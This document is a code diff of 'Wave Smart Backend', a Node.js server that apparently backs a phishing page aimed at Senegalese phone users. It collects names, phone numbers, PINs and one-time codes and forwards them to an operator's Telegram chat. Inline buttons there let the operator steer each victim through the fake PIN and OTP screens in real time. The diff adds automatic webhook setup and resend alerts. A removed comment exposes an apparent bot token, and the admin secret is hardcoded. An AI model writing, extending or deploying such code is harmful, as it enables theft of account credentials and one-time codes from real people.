@@ -1,7 +1,5 @@
 // ─────────────────────────────────────────────────────────────────
 //  Wave Smart Backend — server.js
-//  Captures logins, sends Telegram alerts with inline action buttons.
-//  Buttons disappear after being clicked (edited out of the message).
 // ─────────────────────────────────────────────────────────────────
 
 require('dotenv').config();
@@ -15,9 +13,10 @@ const app  = express();
 const PORT = process.env.PORT || 3000;
 
 // ── Config ────────────────────────────────────────────────────────
-const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
-const TG_API    = `https://api.telegram.org/bot${BOT_TOKEN}`;
+const BOT_TOKEN   = process.env.TELEGRAM_BOT_TOKEN;
+const CHAT_ID     = process.env.TELEGRAM_CHAT_ID;
+const WEBHOOK_URL = process.env.WEBHOOK_URL; // e.g. https://new-9xcj.onrender.com
+const TG_API      = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
 if (!BOT_TOKEN || !CHAT_ID) {
   console.error('❌  Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in .env');
@@ -37,7 +36,6 @@ app.get('/', (req, res) => {
 // ── In-memory session store ────────────────────────────────────────
 const sessions = {};
 
-// Clean up sessions older than 30 minutes every 10 minutes
 setInterval(() => {
   const cutoff = Date.now() - 30 * 60 * 1000;
   for (const [id, s] of Object.entries(sessions)) {
@@ -47,49 +45,79 @@ setInterval(() => {
 
 // ── Telegram helpers ───────────────────────────────────────────────
 
-/** Send a message with optional inline keyboard. Returns full response. */
 async function tgSend(text, replyMarkup = null) {
   try {
     const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML' };
     if (replyMarkup) body.reply_markup = replyMarkup;
     const res  = await fetch(`${TG_API}/sendMessage`, {
-      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(body),
     });
     const data = await res.json();
     if (!data.ok) console.error('Telegram sendMessage error:', data.description);
     return data;
-  } catch (err) { console.error('Telegram fetch error:', err.message); }
+  } catch (err) {
+    console.error('Telegram fetch error:', err.message);
+  }
 }
 
-/** Edit a message text and remove all inline buttons. */
 async function tgEditMessage(messageId, newText) {
   try {
     const res  = await fetch(`${TG_API}/editMessageText`, {
-      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        chat_id: CHAT_ID, message_id: messageId,
-        text: newText, parse_mode: 'HTML',
-        reply_markup: { inline_keyboard: [] },
+        chat_id:      CHAT_ID,
+        message_id:   messageId,
+        text:         newText,
+        parse_mode:   'HTML',
+        reply_markup: { inline_keyboard: [] }, // ← removes all buttons
       }),
     });
     const data = await res.json();
     if (!data.ok) console.error('Telegram editMessage error:', data.description);
     return data;
-  } catch (err) { console.error('Telegram edit error:', err.message); }
+  } catch (err) {
+    console.error('Telegram edit error:', err.message);
+  }
 }
 
-/** Answer callback query — removes loading spinner on button. */
 async function tgAnswerCallback(callbackQueryId, text = '') {
   try {
     await fetch(`${TG_API}/answerCallbackQuery`, {
-      method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ callback_query_id: callbackQueryId, text }),
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ callback_query_id: callbackQueryId, text, show_alert: false }),
     });
-  } catch (err) { console.error('Telegram answerCallback error:', err.message); }
+  } catch (err) {
+    console.error('Telegram answerCallback error:', err.message);
+  }
 }
 
-/** Readable timestamp in Dakar time */
+async function registerWebhook() {
+  if (!WEBHOOK_URL) {
+    console.warn('⚠️  WEBHOOK_URL not set — buttons will not work. Add it to Render env vars.');
+    return;
+  }
+  try {
+    const url  = `${WEBHOOK_URL}/webhook`;
+    const res  = await fetch(`${TG_API}/setWebhook`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ url, allowed_updates: ['callback_query', 'message'] }),
+    });
+    const data = await res.json();
+    if (data.ok) {
+      console.log(`✅  Telegram webhook registered → ${url}`);
+    } else {
+      console.error('❌  Webhook registration failed:', data.description);
+    }
+  } catch (err) {
+    console.error('Webhook registration error:', err.message);
+  }
+}
+
 function now() {
   return new Date().toLocaleString('fr-FR', {
     timeZone: 'Africa/Dakar', dateStyle: 'short', timeStyle: 'medium',
@@ -175,6 +203,30 @@ app.post('/api', async (req, res) => {
 
       if (sent && sent.ok) session.otpMsgId = sent.result.message_id;
 
+      // Reset OTP status so frontend keeps polling
+      session.status = 'otp_pending';
+
+      return res.json({ success: true });
+    }
+
+    case 'otp_resend': {
+      const { sessionId } = data;
+      const session = sessions[sessionId];
+      if (!session) return res.json({ success: false, error: 'Session not found' });
+
+      console.log(`[RESEND] Session: ${sessionId}`);
+
+      // Alert admin that user requested a resend
+      await tgSend(
+        `🔄 <b>OTP Resend Requested</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━\n` +
+        `👤 <b>Name:</b> ${session.firstName} ${session.lastName}\n` +
+        `📱 <b>Phone:</b> 🇸🇳 +221 ${session.phone}\n` +
+        `🕐 <b>Time:</b> ${now()}`
+      );
+
+      session.status = 'otp_pending';
+
       return res.json({ success: true });
     }
 
@@ -205,47 +257,49 @@ app.post('/api', async (req, res) => {
   }
 });
 
-/** Frontend polls this every second to check session status */
+// Frontend polls this every second
 app.get('/api', (req, res) => {
   const { action, sessionId } = req.query;
+
   if (action === 'check_status') {
     const session = sessions[sessionId];
     if (!session) return res.json({ success: false, error: 'Session not found' });
     return res.json({ success: true, status: session.status });
   }
+
   res.status(400).json({ success: false, error: 'Unknown action' });
 });
 
 /**
  * POST /webhook
  * Telegram sends button click events here.
- *
- * ⚠️  IMPORTANT: Register this URL with Telegram once after deploying:
- * Open in browser (replace YOUR_TOKEN):
- * https://api.telegram.org/bot7624277379:AAFXUby_omgmGAIQPy2pmNX1i8OqnauEvjk/setWebhook?url=https://new-9xcj.onrender.com/webhook
+ * Registered automatically on startup via WEBHOOK_URL env var.
  */
 app.post('/webhook', async (req, res) => {
+  // Always respond 200 immediately so Telegram doesn't retry
+  res.sendStatus(200);
+
   const update = req.body;
-  if (!update.callback_query) return res.sendStatus(200);
+  if (!update.callback_query) return;
 
-  const cb                   = update.callback_query;
-  const cbId                 = cb.id;
-  const [action, sessionId]  = cb.data.split('::');
-  const session              = sessions[sessionId];
+  const cb                  = update.callback_query;
+  const cbId                = cb.id;
+  const parts               = cb.data.split('::');
+  const action              = parts[0];
+  const sessionId           = parts[1];
+  const session             = sessions[sessionId];
 
-  // Session gone or expired
   if (!session) {
     await tgAnswerCallback(cbId, '⚠️ Session expired');
-    return res.sendStatus(200);
+    return;
   }
 
   switch (action) {
 
-    // ── ✅ Continue → user goes to OTP screen ─────────────────────
     case 'approve': {
       if (session.status !== 'pending') {
         await tgAnswerCallback(cbId, '⚠️ Already actioned');
-        break;
+        return;
       }
       session.status = 'approved';
       await tgAnswerCallback(cbId, '✅ User moved to OTP screen');
@@ -260,11 +314,10 @@ app.post('/webhook', async (req, res) => {
       break;
     }
 
-    // ── ❌ Wrong PIN → error shown to user, PIN cleared ───────────
     case 'wrong_pin': {
       if (session.status !== 'pending') {
         await tgAnswerCallback(cbId, '⚠️ Already actioned');
-        break;
+        return;
       }
       session.status = 'wrong_pin';
       await tgAnswerCallback(cbId, '❌ Wrong PIN sent to user');
@@ -279,7 +332,6 @@ app.post('/webhook', async (req, res) => {
       break;
     }
 
-    // ── ✅ Approve OTP → user proceeds ────────────────────────────
     case 'approve_otp': {
       session.status = 'continue';
       await tgAnswerCallback(cbId, '✅ OTP approved');
@@ -294,7 +346,6 @@ app.post('/webhook', async (req, res) => {
       break;
     }
 
-    // ── ❌ Wrong Code → error shown to user, OTP cleared ──────────
     case 'wrong_code': {
       session.status = 'wrong_code';
       await tgAnswerCallback(cbId, '❌ Wrong code sent to user');
@@ -312,11 +363,9 @@ app.post('/webhook', async (req, res) => {
     default:
       await tgAnswerCallback(cbId, '⚠️ Unknown action');
   }
-
-  res.sendStatus(200);
 });
 
-/** Admin: list all sessions */
+// Admin: list sessions
 app.get('/api/sessions', (req, res) => {
   const secret       = req.query.secret || req.headers['x-admin-secret'];
   const ADMIN_SECRET = process.env.ADMIN_SECRET || 'wavesmart2026';
@@ -333,17 +382,17 @@ app.get('/api/sessions', (req, res) => {
 });
 
 // ── Start ──────────────────────────────────────────────────────────
-app.listen(PORT, () => {
+app.listen(PORT, async () => {
   console.log(`\n🚀  Wave Smart Backend on port ${PORT}`);
-  console.log(`📡  Bot: @wwwwavvebot  |  Chat: ${CHAT_ID}`);
-  console.log(`\n⚠️  Register webhook once:`);
-  console.log(`    ${TG_API}/setWebhook?url=https://new-9xcj.onrender.com/webhook\n`);
+  console.log(`📡  Bot: @wwwwavvebot  |  Chat: ${CHAT_ID}\n`);
+
+  // Auto-register webhook so buttons work immediately
+  await registerWebhook();
 
   tgSend(
     `✅ <b>Wave Smart Backend Started</b>\n` +
     `━━━━━━━━━━━━━━━━━━━━\n` +
     `🕐 <b>Time:</b> ${now()}\n` +
-    `🌐 <b>Port:</b> ${PORT}\n` +
     `🔘 Inline buttons active`
   );
 });
